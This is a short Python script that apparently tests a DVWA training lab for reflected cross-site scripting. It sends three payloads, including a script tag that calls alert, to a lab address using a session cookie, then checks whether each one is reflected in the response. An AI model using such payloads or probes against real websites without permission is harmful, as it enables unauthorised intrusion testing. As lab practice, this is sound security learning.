import requests

header = {"Cookie": "security=medium; PHPSESSID=7tqna1iqtncql36tu48fae6rc6"}

xss_list = ["XSS", "<h1>XSS", "<script>alert('XSS')</script>"]

for payload in xss_list:
    print(payload)
    url = "http://10.10.119.3/vulnerabilities/xss_r/?name="+str(payload)
    result = requests.get(url=url, headers=header)

    if str(payload) in str(result.content):
        print("Probably XSS!")
